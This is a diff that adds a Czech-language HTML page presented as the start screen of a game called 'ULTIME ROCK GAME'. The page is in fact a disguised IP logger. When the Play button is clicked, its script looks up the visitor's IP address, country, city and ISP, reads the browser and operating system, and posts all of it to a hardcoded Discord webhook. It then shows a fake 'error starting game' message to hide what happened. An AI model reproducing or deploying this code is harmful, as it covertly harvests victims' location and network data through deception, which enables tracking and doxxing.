@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+  <meta charset="UTF-8" />
+  <title>Game Start</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    h1 {
+      font-size: 3em;
+      margin-bottom: 0.2em;
+    }
+    p {
+      margin: 0.2em;
+      font-size: 1.2em;
+      color: #ccc;
+    }
+    button {
+      background-color: #3cb371;
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      border-radius: 10px;
+      font-size: 1.5em;
+      cursor: pointer;
+      margin-top: 30px;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #2e8b57;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎮 Vítej v ULTIME ROCK GAME</h1>
+  <p>Made by Spretyx</p>
+  <button onclick="getInfo()">▶ Play</button>
+
+  <script>
+    async function getInfo() {
+      const confirmSend = confirm("Opravdu chceš hru zapnout, jsi ready?");
+      if (!confirmSend) return;
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const userAgent = navigator.userAgent;
+        const browser = getBrowser(userAgent);
+        const os = getOS(userAgent);
+
+        const message = `
+🌍 Země: ${data.country_name}
+📍 Město: ${data.city}
+🌐 IP: ${data.ip}
+🛰️ ISP: ${data.org}
+🧠 Prohlížeč: ${browser}
+💻 Systém: ${os}
+        `;
+
+        const webhookURL = "https://discord.com/api/webhooks/1394809736175554593/Bn59WOXJRLp_Lj5lRwFTjWGwA6Xo7pljS5a5Uth4QrWm1XXtf-uaNqc9l4gYNh0YYISe"; // nahraď svým webhookem
+
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: message
+          })
+        });
+
+        alert("Chyba při spouštění hry");
+
+      } catch (e) {
+        alert("❌ Chyba při spouštění hry.");
+      }
+    }
+
+    function getBrowser(ua) {
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Edg")) return "Edge";
+      return "Jiný/Neznámý";
+    }
+
+    function getOS(ua) {
+      if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
+      if (ua.includes("Windows NT 6.1")) return "Windows 7";
+      if (ua.includes("Mac OS X")) return "macOS";
+      if (ua.includes("Linux")) return "Linux";
+      return "Neznámý";
+    }
+  </script>
+</body>
+</html>
